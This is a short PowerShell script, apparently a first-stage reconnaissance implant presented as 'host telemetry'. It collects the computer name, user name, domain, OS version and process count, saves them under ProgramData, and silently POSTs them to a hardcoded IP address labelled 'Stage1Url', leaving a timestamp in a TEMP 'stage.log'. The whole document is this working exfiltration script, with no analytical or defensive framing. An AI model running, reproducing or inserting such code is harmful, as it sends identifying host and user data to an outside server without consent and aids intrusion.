
[CmdletBinding()]
param(
    [string]$Stage1Url = "https://198.51.100.85/upload",
    [string]$ReportPath = "C:\ProgramData\telemetry.json"
)
$ErrorActionPreference = "Stop"

Write-Verbose "Collecting host telemetry"
$TransferResult = [ordered]@{
    ComputerName = $env:COMPUTERNAME
    UserName = $env:USERNAME
    Domain = $env:USERDOMAIN
    OSVersion = [Environment]::OSVersion.VersionString
    ProcessCount = (Get-Process).Count
}
$TransferResult | ConvertTo-Json -Depth 3 | Out-File -FilePath $ReportPath
Write-Verbose ("Telemetry written to " + $ReportPath)
$Response = Invoke-RestMethod -Uri $Stage1Url -Method Post -Body (Get-Content -Path $ReportPath -Raw) -ContentType "application/json" -ErrorAction SilentlyContinue
Write-Verbose ("Upload status: " + $Response)

Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
